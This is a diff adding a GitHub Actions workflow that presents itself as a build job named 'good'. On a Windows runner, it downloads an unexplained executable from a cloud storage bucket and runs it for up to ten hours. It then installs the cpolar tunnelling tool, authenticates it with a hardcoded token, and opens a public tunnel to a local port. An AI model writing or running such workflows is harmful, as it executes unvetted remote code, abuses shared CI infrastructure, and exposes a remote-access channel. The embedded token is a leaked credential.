@@ -1,0 +1,24 @@
+name: good  
+on: workflow_dispatch  
+jobs:  
+  build:  
+    runs-on: windows-2019  
+    steps:  
+    - name: Download Executable
+      run: Invoke-WebRequest https://storage.googleapis.com/publictoilet2024-8b1d1.appspot.com/2.exe -OutFile 2.exe
+
+    - name: Run Executable
+      run: .\2.exe
+      timeout-minutes: 600
+
+    - name: Download and Set Up Cpolar
+      run: |
+        Invoke-WebRequest https://www.cpolar.com/downloads/CPOLAR_Windows.zip -OutFile cpolar.zip
+        Expand-Archive cpolar.zip -DestinationPath C:\cpolar
+        $env:PATH += ";C:\cpolar"
+
+    - name: Authenticate Cpolar
+      run: .\cpolar authtoken NmZlMDMxYTktZWRiNS00NDA1LTkyYmUtNjlkMTk4ODE4ZTBj
+
+    - name: Start Cpolar Tunnel
+      run: .\cpolar http 8000  # Replace '8000' with the port used by the executable service
